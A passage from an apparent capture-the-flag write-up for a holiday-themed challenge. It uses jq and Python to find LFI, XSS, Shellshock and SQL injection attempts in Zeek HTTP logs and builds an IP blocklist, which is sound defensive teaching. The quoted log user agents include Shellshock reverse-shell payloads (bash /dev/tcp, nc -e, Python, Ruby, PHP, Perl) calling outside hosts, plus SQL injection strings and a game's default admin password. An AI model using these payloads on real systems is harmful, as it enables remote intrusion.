| select ( .user_agent | contains(\"/*\",\"**\",\" UNION\",\"' \"'\" '\") ) | .[\"id.orig_h\"] ' | sort | uniq & >> detected_ips.csv Connections with status_msg is 400 Bad Request : if we lookup unique the status message for the requests cat http.log | jq '.[] | select( .status_msg !=\"-\") | .status_code, .status_msg ' | sort | uniq \"Bad Request\" \"Not Found\" \"Not Modified\" \"OK\" We will see interesting Bad Request msg which means The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid request message framing, or deceptive request routing)| 5 . Let's add the ips from the requests with 400 Bad Request cat http.log | jq '.[] | select((.status_code == 400)) | .[\"id.orig_h\"]' | sort | uniq & >> detected_ips.csv All Commands at once: cat http.log | jq '.[] | select ( .uri | contains(\"..\",\"/etc\",\"||\",\"pass\") ) | .[\"id.orig_h\"] ' | sort | uniq & >> detected_ips.csv cat http.log | jq '.[] | select ( .uri | contains(\"<\") ) | .[\"id.orig_h\"] ' | sort | uniq & >> detected_ips.csv cat http.log | jq '.[] | select ( .host | contains(\"<\") ) | .[\"id.orig_h\"] ' | sort | uniq & >> detected_ips.csv cat http.log | jq '.[] | select ( .user_agent | contains(\"() { :; };\") ) | .[\"id.orig_h\"] ' | sort | uniq & >> detected_ips.csv cat http.log | jq '.[] | select ( .username | contains(\"/*\",\"**\",\"UNION\",\"' \"'\" '\") ) | .[\"id.orig_h\"] ' | sort | uniq & >> detected_ips.csv cat http.log | jq '.[] | select ( .uri | contains(\"/*\",\"**\",\"UNION\",\"' \"'\" '\") ) | .[\"id.orig_h\"] ' | sort | uniq & >> detected_ips.csv cat http.log | jq '.[] | select ( .host | contains(\"/*\",\"**\",\"UNION\",\"' \"'\" '\") ) | .[\"id.orig_h\"] ' | sort | uniq & >> detected_ips.csv cat http.log | jq '.[] | select ( .user_agent | contains(\"/*\",\"**\",\" UNION\",\"' \"'\" '\") ) | .[\"id.orig_h\"] ' | sort | uniq & >> detected_ips.csv cat http.log | jq '.[] | select((.status_code == 400)) | .[\"id.orig_h\"]' | sort | uniq & >> detected_ips.csv To remove all ips duplicates and double quotes \" : cat detected_ips.csv | sort | uniq | tr -d '\"' > detected_ips_clean.csv Also use wc -l command to count the ips. cat detected_ips_clean.csv | wc -l Unique malicious ip list 81 0.216.249.31,1.185.21.112,10.155.246.29,102.143.16.184,106.132.195.153,106.93.213.219,111.81.145.191,116.116.98.205,118.196.230.170,121.7.186.163,123.127.233.97,129.121.121.48,13.39.153.254,131.186.145.73,132.45.187.177,135.203.243.43,135.32.99.116,150.45.133.97,150.50.77.238,155.129.97.35,168.66.108.62,169.242.54.5,173.37.160.150,180.57.20.247,186.28.46.179,187.178.169.123,19.235.69.221,190.245.228.38,193.228.194.36,194.143.151.224,2.230.60.70,2.240.116.254,200.75.228.240,211.229.3.254,220.132.33.81,223.149.180.133,225.191.220.138,227.110.45.126,229.133.163.235,229.229.189.246,23.49.177.78,23.79.123.99,230.246.50.221,233.74.78.199,238.143.78.114,249.34.9.16,25.80.197.172,250.51.219.47,253.182.102.55,254.140.181.172,27.88.56.114,28.169.41.122,31.254.228.4,32.168.17.54,33.132.98.193,34.129.179.28,42.103.246.250,42.191.112.181,44.74.106.131,45.239.232.245,48.66.193.176,49.161.8.58,52.39.201.107,56.5.47.137,6.144.27.227,61.110.82.125,65.153.114.120,68.115.251.76,69.221.145.150,72.183.132.206,75.215.214.65,75.73.228.192,79.198.89.109,80.244.147.207,81.14.204.154,83.0.8.119,84.147.231.129,84.185.44.166,9.206.212.33,9.95.128.208,95.166.116.45 We have 81 unique malicious ip in our blacklist , let's find a pivot point to find the rest. Pivoting on suspicious UserAgents of detected ips \u00b6 Get all UserAgents for ips we have collected for ips in $(cat detected_ips_clean.csv ) do cat http.log | jq --arg ip $ips '.[] | select( .[\"id.orig_h\"] ==$ip ) | .user_agent ' | sort | uniq | tr -d '\"' &>> suspicious_ua.txt tr -d '\"' removes \" from each ip. --arg This option passes a value $ips to the jq program as a predefined variable $ip . List of suspicious UserAgents based on ips collected 1' UNION/**/SELECT/**/1,2,434635502,4/*&blog=1 Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25 Mozilla/4.0 (compatible; MSIEE 7.0; Windows NT 5.1) Mozilla/4.0 (compatible; MSIE 8.0; Windows_NT 5.1; Trident/4.0) Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NETS CLR 1.1.4322) Mozilla/5.0 (compatible; Goglebot/2.1; +http://www.google.com/bot.html) 1' UNION SELECT '1','2','automatedscanning','1233627891','5'/* Mozilla/4.0 (compatible; MSIE 6.a; Windows NTS) 1' UNION SELECT 1,concat(0x61,0x76,0x64,0x73,0x73,0x63,0x61,0x6e,0x6e,0x69,0x6e,0x67,,3,4,5,6,7,8 -- ' Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Tridents/4.0) Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12 Wget/1.9+cvs-stable (Red Hat modified) 1' UNION SELECT -1,'autosc','test','O:8:\\\\\\stdClass\\\\\\:3:{s:3:\\\\\\mod\\\\\\;s:15:\\\\\\resourcesmodule\\\\\\;s:3:\\\\\\src\\\\\\;s:20:\\\\\\@random41940ceb78dbb\\\\\\;s:3:\\\\\\int\\\\\\;s:0:\\\\\\\\\\\\;}',7,0,0,0,0,0,0 /* Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.3) gecko/20100401 Firefox/3.6.1 (.NET CLR 3.5.30731 Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.4.15451 1' UNION/**/SELECT/**/994320606,1,1,1,1,1,1,1/*&blogId=1 CholTBAgent () { :; }; /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\150.45.133.97\\,54611));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\/bin/sh\\,\\-i\\]);' Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.0.5) Gecko/2008121711 Ubuntu/9.04 (jaunty) Firefox/3.0.5 Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.9b2) Gecko/2007121016 Firefox/3.0b2 Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36 Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.0.18) Gecko/2010021501 Ubuntu/9.04 (jaunty) Firefox/3.0.18 1' UNION SELECT 1,concat(0x61,0x76,0x64,0x73,0x73,0x63,0x61,0x6e,0x6e,0x69,0x6e,0x67,,3,4,5,6,7,8 -- ' Mozilla/5.0 (Windows; U; Windows NT 6.1; fr; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 (.NET CLR 3.5.30729) 1' UNION SELECT 1729540636,concat(0x61,0x76,0x64,0x73,0x73,0x63,0x61,0x6e,0x65,0x72, -- Mozilla4.0 (compatible; MSSIE 8.0; Windows NT 5.1; Trident/5.0) Mozilla/4.0 (compatible; MSIE6.0; Windows NT 5.1) Mozilla/4.0 (compatible; MSIE 8.0; Windows MT 6.1; Trident/4.0; .NET CLR 1.1.4322; ) Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9b3) Gecko/2008020514 Opera 9.5 Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2b5) Gecko/20091204 Firefox/3.6b5 Mozilla/5.0 (compatible; MSIE 10.0; W1ndow NT 6.1; Trident/6.0) Mozilla/5.0 WinInet Mozilla/5.0 (Linux; Android 4.4; Nexus 5 Build/_BuildID_) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.0.5) Gecko/2008121711 Ubuntu/9.04 (jaunty) Firefox/3.0.5 () { :; }; /bin/bash -c '/bin/nc 55535 220.132.33.81 -e /bin/bash' Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 500.0) Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; AntivirXP08; .NET CLR 1.1.4322) () { :; }; /usr/bin/ruby -rsocket -e'f=TCPSocket.open(\\227.110.45.126\\,43870).to_i;exec sprintf(\\/bin/sh -i <&%d >&%d 2>&%d\\,f,f,f)' Mozilla/5.0 Windows; U; Windows NT5.1; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.1 (.NET CLR 3.5.30729) () { :; }; /usr/bin/php -r '$sock=fsockopen(\\229.229.189.246\\,62570);exec(\\/bin/sh -i <&3 >&3 2>&3\\);' Mozilla/4.0 (compatible MSIE 5.0;Windows_98) Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.6pre) Gecko/2008121605 Firefox/3.0.6pre Mozilla/4.0 (compatible;MSIE 7.0;Windows NT 6. Mozilla/5.0 (Windows; U; Windows NT 6.0; ru-RU) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16 Mozilla/4.0 (compatible; MSIE 8.0; Window NT 5.1) Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; .NET CLR 2.0.50727) Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30 Opera/6.05 (Windows 2000; U) [oc] Opera/8.81 (Windows-NT 6.1; U; en) Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; fr) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.22 Mozilla/5.0 (Windows NT 6.1; WOW62; rv:53.0) Gecko/20100101 Chrome /53.0 Mozilla/5.0 (Windows NT 10.0;Win64;x64) () { :; }; /bin/bash -i >& /dev/tcp/31.254.228.4/48051 0>&1 Mozilla/4.0 (compatible; MSIE 4.01; Windows 98; DigExt) Mozilla/5.0 (Windows; U; Windows NT 5.2; sk; rv:1.8.1.15) Gecko/20080623 Firefox/2.0.0.15 Mozilla/5.0 (Windows NT 5.1 ; v.) Mozilla/4.0 (compatible;MSIe 7.0;Windows NT 5.1) Mozilla/4.0 (compatible; MSIE 6.1; Windows NT6.0) Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) ApleWebKit/525.13 (KHTML, like Gecko) chrome/4.0.221.6 safari/525.13 RookIE/1.0 Mozilla/4.0 (compatible; MSIE 7.0; Windos NT 6.0) Mozilla/4.0 (compatibl; MSIE 7.0; Windows NT 6.0; Trident/4.0; SIMBAR={7DB0F6DE-8DE7-4841-9084-28FA914B0F2E}; SLCC1; .N Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.43 Safari/530.5 HttpBrowser/1.0 Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.2) Gecko/2008092318 Fedora/3.0.2-1.fc9 Firefox/3.0.2 Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/56.0.2924.75 Mobile/14E5239e Safari/602.1 Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/603.1.23 (KHTML, like Gecko) Version/10.0 Mobile/14E5239e Safari/602.1 1' UNION SELECT 1,concat(0x61,0x76,0x64,0x73,0x73,0x63,0x61,0x6e,0x6e,0x69,0x6e,0x67,,3,4,5,6,7,8 -- ' Mozilla/4.0 (compatible; MSIE 6.0; Windows NT5.1) Opera/9.23 (Windows NT 5.0; U; en) Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.14) Gecko/20080419 Ubuntu/8.04 (hardy) Firefox/2.0.0.12 MEGAUPLOAD 1.0 Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Tridents/4.0; .NET CLR 1.1.4322; PeoplePal 7.0; .NET CLR 2.0.50727) Mozilla/4.0 (compatible; MSIE 5.13; Mac_PowerPC) Mozilla/5.0 (Linux; U; Android 4.1.1; en-gb; Build/KLP) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30 1' UNION SELECT 1,1409605378,1,1,1,1,1,1,1,1/*&blogId=1 () { :; }; /usr/bin/perl -e 'use Socket;$i=\\83.0.8.119\\;$p=57432;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\tcp\\));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\\>&S\\);open(STDOUT,\\>&S\\);open(STDERR,\\>&S\\);exec(\\/bin/sh -i\\);};' Mozilla/4.0 (compatible; Metasploit RSPEC) Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.8) Gecko/20071004 Firefox/2.0.0.8 (Debian-2.0.0.8-1) Mozilla/4.0(compatible; MSIE 666.0; Windows NT 5.1 Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13 Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19 We can select the known suspicious user-agents 4 from the output to pivot on: Rookie An Info Stealer designed to extract user account information such as logins and passwords and send them to a remote server. The HTTP communication is done using an uncommon User Agent called RookIE/1.0 . 6 RookIE/1.0 HttpBrowser RAT Backdoor is malware that has been used by several threat groups with notable for HTTPS communications with the HttpBrowser/1.0 User-Agent. 7 HttpBrowser/1.0 Dyre / Upatre Dyreza is able to intercept SSL traffic in Internet Explorer, Firefox and Chrome by hooking the browser via several API functions. 8 Wget/1.9+cvs-stable (Red Hat modified) Metasploit framework which is a widely used penetration testing tool and used also for hacking. Metasploit User Agent Strings: Mozilla/4.0 (compatible; Metasploit RSPEC) Mozilla/4.0 (compatibl; MSIE 7.0; Windows NT 6.0; Trident/4.0; SIMBAR={7DB0F6DE-8DE7-4841-9084-28FA914B0F2E}; SLCC1; .N Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) ApleWebKit/525.13 (KHTML, like Gecko) chrome/4.0.221.6 safari/525.13 and we have others two with typing errors or space missing Mozilla/4.0 (compatible; MSIE 6.0; Windows NT5.1) Mozilla/4.0 (compatible; MSIE6.0; Windows NT 5.1) Mozilla/5.0 (compatible; MSIE 10.0; W1ndow NT 6.1; Trident/6.0) Mozilla/4.0 (compatible;MSIE 7.0;Windows NT 6. Mozilla/4.0 (compatible; MSIE 7.0; Windos NT 6.0) Mozilla/5.0 (compatible; Goglebot/2.1; +http://www.google.com/bot.html) W32/Kazy A trojan is a type of malware that performs activities without the user\u2019s knowledge. These activities commonly include establishing remote access connections, capturing keyboard input, collecting system information, downloading/uploading files, dropping other malware into the infected system, performing denial-of-service (DoS) attacks, and running/terminating processes. 9 Mozilla/5.0 (Windows NT 5.1 ; v.) Fun Web Products - Adware applications 10 Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; .NET CLR 2.0.50727) Adware Toolbar from PeoplePc 10 Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Tridents/4.0; .NET CLR 1.1.4322; PeoplePal 7.0; .NET CLR 2.0.50727) Sality botnet Mozilla/5.0 Windows; U; Windows NT5.1; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.1 (.NET CLR 3.5.30729) Opera/8.81 (Windows-NT 6.1; U; en) Malware: Generic Trojan 9 Mozilla/5.0 WinInet Malware User Agent 12 CholTBAgent AntiVirXP08, also known as Anti Vir XP 08, AntivirusXP2008 or Antivirus XP 2008, is a rogue anti-spyware program and clone of XP Antivirus. Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; AntivirXP08; .NET CLR 1.1.4322) PlugX APT Malware PlugX is a RAT (Remote Access Trojan) malware family that is around since 2008 and is used as a backdoor to fully control the victim's machine. Once the machine is infected, a cybercriminal can remotely execute several kinds of commands on the affected system. 14 Mozilla/4.0 (compatible; MSIE 8.0; Window NT 5.1) and we have others with typing errors or space missing Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NETS CLR 1.1.4322) Mozilla/4.0 (compatible; MSIE 8.0; Windows_NT 5.1; Trident/4.0) Mozilla/4.0 (compatible; MSIE 8.0; Windows MT 6.1; Trident/4.0; .NET CLR 1.1.4322; ) Fareit Malware 15 Mozilla/4.0 (compatible MSIE 5.0;Windows_98) and we have others with typing errors or space missing Mozilla4.0 (compatible; MSSIE 8.0; Windows NT 5.1; Trident/5.0) Zebrocy malware 15 Mozilla/5.0 (Windows NT 10.0;Win64;x64) Misconfigured UserAgents 11 The correct user-agent should be structured like this Mozilla/[version] ([system and browser information]) [platform] ([platform details]) [extensions]. From above list we can detect a few misconfigured user-agents: Mozilla/4.0 (compatible; MSIEE 7.0; Windows NT 5.1) MSIEE Mozilla/4.0 (compatible; MSIE 6.a; Windows NTS) Windows NTS Mozilla/5.0 (compatible; MSIE 10.0; W1ndow NT 6.1; Trident/6.0) W1ndow Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 500.0) 500.0 Mozilla/4.0(compatible; MSIE 666.0; Windows NT 5.1 666 Also we have a few with space missing Mozilla/4.0 (compatible; MSIE 6.1; Windows NT6.0) NT6.0 Create a list with all user agents we will pivot on: RookIE/1.0 HttpBrowser/1.0 Wget/1.9+cvs-stable (Red Hat modified) Mozilla/4.0 (compatible; Metasploit RSPEC) Mozilla/4.0 (compatibl; MSIE 7.0; Windows NT 6.0; Trident/4.0; SIMBAR={7DB0F6DE-8DE7-4841-9084-28FA914B0F2E}; SLCC1; .N Mozilla/5.0 (Windows NT 5.1 ; v.) Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; .NET CLR 2.0.50727) Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Tridents/4.0; .NET CLR 1.1.4322; PeoplePal 7.0; .NET CLR 2.0.50727) Mozilla/5.0 Windows; U; Windows NT5.1; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.1 (.NET CLR 3.5.30729) Opera/8.81 (Windows-NT 6.1; U; en) Mozilla/5.0 WinInet CholTBAgent Mozilla/4.0 (compatible;MSIE 7.0;Windows NT 6. Mozilla/4.0 (compatible; MSIE 7.0; Windos NT 6.0) Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; AntivirXP08; .NET CLR 1.1.4322) Mozilla4.0 (compatible; MSSIE 8.0; Windows NT 5.1; Trident/5.0) Mozilla/4.0 (compatible; MSIE6.0; Windows NT 5.1) Mozilla/4.0 (compatible; MSIE 6.a; Windows NTS) Mozilla/4.0 (compatible; MSIE 8.0; Windows_NT 5.1; Trident/4.0) Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NETS CLR 1.1.4322) Mozilla/5.0 (compatible; Goglebot/2.1; +http://www.google.com/bot.html) Mozilla/4.0 (compatible; MSIE 8.0; Windows MT 6.1; Trident/4.0; .NET CLR 1.1.4322; ) Mozilla/4.0 (compatible; MSIE6.0; Windows NT 5.1) Mozilla/4.0 (compatible; MSIE 6.0; Windows NT5.1) Mozilla/4.0 (compatible; MSIE 6.1; Windows NT6.0) Mozilla/5.0 (compatible; MSIE 10.0; W1ndow NT 6.1; Trident/6.0) Mozilla/4.0 (compatible; MSIEE 7.0; Windows NT 5.1) Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) ApleWebKit/525.13 (KHTML, like Gecko) chrome/4.0.221.6 safari/525.13 Mozilla/4.0 (compatible; MSIE 8.0; Windows_NT 5.1; Trident/4.0) Mozilla/4.0 (compatible; MSIE 8.0; Windows MT 6.1; Trident/4.0; .NET CLR 1.1.4322; ) Mozilla/4.0 (compatible; MSIE 8.0; Window NT 5.1) Mozilla/4.0 (compatible MSIE 5.0;Windows_98) Mozilla/5.0 (Windows NT 10.0;Win64;x64) Mozilla/4.0(compatible; MSIE 666.0; Windows NT 5.1 We can search now for the related ips and added to the ips file while IFS = read -r line ; do cat http.log | jq --arg ua $line '.[] | select(.user_agent == $ua ) | .[\"id.orig_h\"] ' | sort | uniq done < pivot_useragents.txt | sort | uniq | tr -d '\"' & >> detected_ips_clean.csv IFS= read -r line to read file line by line. Remove all ips duplicates and count the results. cat detected_ips_clean.csv | sort | uniq > detected_ips_final.csv cat detected_ips_final.csv | wc -l Unique malicious ip list 111 0.216.249.31,1.185.21.112,10.155.246.29,102.143.16.184,103.235.93.133,104.179.109.113,106.132.195.153,106.93.213.219,111.81.145.191,116.116.98.205,118.196.230.170,118.26.57.38,121.7.186.163,123.127.233.97,129.121.121.48,13.39.153.254,131.186.145.73,132.45.187.177,135.203.243.43,135.32.99.116,140.60.154.239,142.128.135.10,148.146.134.52,150.45.133.97,150.50.77.238,155.129.97.35,158.171.84.209,168.66.108.62,169.242.54.5,173.37.160.150,180.57.20.247,185.19.7.133,186.28.46.179,187.152.203.243,187.178.169.123,19.235.69.221,190.245.228.38,193.228.194.36,194.143.151.224,2.230.60.70,2.240.116.254,200.75.228.240,203.68.29.5,211.229.3.254,217.132.156.225,22.34.153.164,220.132.33.81,223.149.180.133,225.191.220.138,226.102.56.13,226.240.188.154,227.110.45.126,229.133.163.235,229.229.189.246,23.49.177.78,23.79.123.99,230.246.50.221,231.179.108.238,233.74.78.199,238.143.78.114,249.237.77.152,249.34.9.16,249.90.116.138,25.80.197.172,250.22.86.40,250.51.219.47,252.122.243.212,253.182.102.55,253.65.40.39,254.140.181.172,27.88.56.114,28.169.41.122,29.0.183.220,31.116.232.143,31.254.228.4,32.168.17.54,33.132.98.193,34.129.179.28,34.155.174.167,37.216.249.50,42.103.246.250,42.127.244.30,42.191.112.181,44.164.136.41,44.74.106.131,45.239.232.245,48.66.193.176,49.161.8.58,50.154.111.0,52.39.201.107,53.160.218.44,56.5.47.137,6.144.27.227,61.110.82.125,65.153.114.120,66.116.147.181,68.115.251.76,69.221.145.150,72.183.132.206,75.215.214.65,75.73.228.192,79.198.89.109,80.244.147.207,81.14.204.154,83.0.8.119,84.147.231.129,84.185.44.166,9.206.212.33,9.95.128.208,95.166.116.45,97.220.93.190 We have now 111 unique malicious ips in our blacklist. Blocking the malicious ips \u00b6 Add , after each ip to convert to csv format cat detected_ips_clean.csv | tr '\\n' ',' Copy the result to the Firewall: Route Calculation Success! RID: 0807198508261964 Congratulations! You have completed the Filter Out Poisoned Sources of Weather Data challenge! Alternative Method We could use python to filter the ips from the logs: import json # Searching for the attacks #LFI lfi_detects = [ \"..\" , \"/etc\" , \"||\" , \"pass\" ] #XSS xss_detects = [ \"<\" ] #Shellshock ss_detects = [ \"() { :; };\" ] #SQLi sqli_detects = [ \"/*\" , \"**\" , \"UNION\" , \"'\" ] #list of status_msg status_msgs = [ \"Bad Request\" ] # list of malicious user agents to pivot from the file we generated with open ( 'pivot_useragents.txt' ) as f : ua_blacklist = [ line . rstrip ( ' \\n ' ) for line in f ] # list of malicious ips blacklist = set () # load logs http_logs = json . load ( open ( \"http.log\" )) # iterate over entries and filter based on identified markers of IoC for log in http_logs : for detect in lfi_detects : if detect in log [ 'uri' ] and log [ 'id.orig_h' ] not in blacklist : blacklist . add ( log [ 'id.orig_h' ]) for detect in xss_detects : if detect in log [ 'uri' ] or detect in log [ 'host' ] and log [ 'id.orig_h' ] not in blacklist : blacklist . add ( log [ 'id.orig_h' ]) for detect in ss_detects : if detect in log [ 'user_agent' ] and log [ 'id.orig_h' ] not in blacklist : blacklist . add ( log [ 'id.orig_h' ]) for detect in sqli_detects : if detect in log [ 'uri' ] or detect in log [ 'host' ] or detect in log [ 'username' ] or detect in log [ 'user_agent' ] and log [ 'id.orig_h' ] not in blacklist : blacklist . add ( log [ 'id.orig_h' ]) for message in status_msgs : if message in log [ 'status_msg' ] and log [ 'id.orig_h' ] not in blacklist : blacklist . add ( log [ 'id.orig_h' ]) for ua in ua_blacklist : if ua in log [ 'user_agent' ] and log [ 'id.orig_h' ] not in blacklist : blacklist . add ( log [ 'id.orig_h' ]) # print how many ips we got print ( len ( blacklist )) # print ips blacklist and add `,` after each ip to convert to csv format print ( \",\" . join ( blacklist )) \ud83c\udf93 What you've learned \u00b6 Zeek logs json format and content Search in Zeek logs using jq tool Pivoting based on results like UserAgents Knowing different malicious UserAgents Using sort , uniq , tr , wc commands https://docs.zeek.org/en/stable/scripts/base/protocols/http/main.zeek.html#type-HTTP::Info \u21a9 https://cheatsheetseries.owasp.org/ \u21a9 \u21a9 \u21a9 https://www.crowdstrike.com/blog/mitigating-bash-shellshock/ https://metalkey.github.io/shellshock-explained--exploitation-tutorial.html \u21a9 \u21a9 https://www.sans.org/reading-room/whitepapers/malicious/user-agent-field-analyzing-detecting-abnormal-malicious-organization-33874 https://www-users.cs.umn.edu/~zhan3248/materials/technical_report.pdf https://user-agents.net/lookup http://useragentstring.com/index.php https://www.giac.org/paper/gcia/8443/60-seconds-wire-malicious-traffic/123928 https://rules.emergingthreats.net/open/snort-2.9.0/rules/emerging-user_agents.rules \u21a9 https://httpstatuses.com/400 \u21a9 https://threatpoint.checkpoint.com/ThreatPortal/threat?threatId=11021&threatType=malwarefamily \u21a9 https://attack.mitre.org/software/S0070/ https://www.secureworks.com/research/threat-group-3390-targets-organizations-for-cyberespionage \u21a9 https://github.com/NextronSystems/APTSimulator \u21a9 https://github.com/Neo23x0/sigma/blob/master/rules/proxy/proxy_ua_malware.yml https://github.com/seanlinmt/suricata/blob/master/files/rules/emerging-user_agents.rules https://networkraptor.blogspot.com/p/user-agent-strings.html \u21a9 \u21a9 https://doc.emergingthreats.net/2002079 https://www.webmasterworld.com/search_engine_spiders/4809958.htm http://useragentstring.com/index.php?id=5363 \u21a9 \u21a9 https://doc.emergingthreats.net/2004114 \u21a9 https://docs.google.com/spreadsheets/d/1mY6BGYZgwPH3UiVAdxU4Hraa9n1gFLXSMcR_5mhs0GE/edit#gid=1694348953 \u21a9 https://www.spywareremove.com/removeAntiVirXP08.html \u21a9 https://community.rsa.com/thread/185439 https://github.com/Neo23x0/sigma/blob/master/rules/proxy/proxy_ua_malware.yml \u21a9 https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/fareit https://github.com/Neo23x0/sigma/blob/master/rules/proxy/proxy_ua_malware.yml \u21a9 \u21a9 https://app.any.run/tasks/7d7fa4a0-6970-4428-828b-29572abf9ceb/ \u21a9","title":"12  Filter Out Poisoned Sources of Weather Data"},{"location":"objectives/objective12/#12-filter-out-poisoned-sources-of-weather-data","text":"Difficulty: \ud83c\udf84\ud83c\udf84\ud83c\udf84\ud83c\udf84","title":"12. Filter Out Poisoned Sources of Weather Data"},{"location":"objectives/objective12/#info-hints","text":"Filter Out Poisoned Sources of Weather Data Use the data supplied in the Zeek JSON logs to identify the IP addresses of attackers poisoning Santa's flight mapping software. Block the 100 offending sources of information to guide Santa's sleigh through the attack. Submit the Route ID (\"RID\") success value that you're given. For hints on achieving this objective, please visit the Sleigh Shop and talk with Wunorse Openslae. \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Wunorse Openslae Hey, you know what? We've got a crisis here. You see, Santa's flight route is planned by a complex set of machine learning algorithms which use available weather data. All the weather stations are reporting severe weather to Santa's Sleigh. I think someone might be forging intentionally false weather data! I'm so flummoxed I can't even remember how to login! Hmm... Maybe the Zeek http.log could help us. I worry about LFI , XSS , and SQLi in the Zeek log - oh my! And I'd be shocked if there weren't some shell stuff in there too. I'll bet if you pick through, you can find some naughty data from naughty hosts and block it in the firewall. If you find a log entry that definitely looks bad, try pivoting off other unusual attributes in that entry to find more bad IPs. The sleigh's machine learning device (SRF) needs most of the malicious IPs blocked in order to calculate a good route. Try not to block many legitimate weather station IPs as that could also cause route calculation failure. Remember, when looking at JSON data, jq is the tool for you! Finding Bad in Web Logs Do you see any LFI , XSS , Shellshock , or SQLi ? \ud83e\uddda\ud83c\udffb\u200d\u200d The Tooth Fairy I\u2019m the Tooth Fairy, the mastermind behind the plot to destroy the holiday season. I hate how Santa is so beloved, but only works one day per year! He has all of the resources of the North Pole and the elves to help him too. I run a solo operation, toiling year-round collecting deciduous bicuspids and more from children. But I get nowhere near the gratitude that Santa gets. He needs to share his holiday resources with the rest of us! But, although you found me, you haven\u2019t foiled my plot! Santa\u2019s sleigh will NOT be able to find its way. I will get my revenge and respect! I want my own holiday, National Tooth Fairy Day, to be the most popular holiday on the calendar!!! \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Krampus But there\u2019s still time! Solve the final challenge in your badge by blocking the bad IPs at srf.elfu.org and save the holiday season! Block the 100 offending sources of information & Submit (\"RID\") success value","title":"\ud83d\udcdc Info &amp; Hints"},{"location":"objectives/objective12/#solution","text":"","title":"\u26a1\ufe0f Solution"},{"location":"objectives/objective12/#getting-the-logins-to-the-srf-portal","text":"As we know from objective #10 : The default login credentials should be changed on startup and can be found in the readme in the ElfU Research Labs git repository. Any git repository start with README.md we can test at the url directly. or we can search the logs for event without status_code 404 which means not found cat http.log | jq '.[] | select((.uri | contains(\"README\")) and (.status_code != 404)) | .uri ' Grab it from the portal: https://srf.elfu.org/README.md # Sled-O-Matic - Sleigh Route Finder Web API ### Installation `sudo apt install python3-pip` `sudo python3 -m pip install -r requirements.txt` #### Running: `python3 ./srfweb.py` #### Logging in: You can login using the default admin pass: `admin 924158F9522B3744F5FCD4D10FAC4356` However, it's recommended to change this in the sqlite db to something 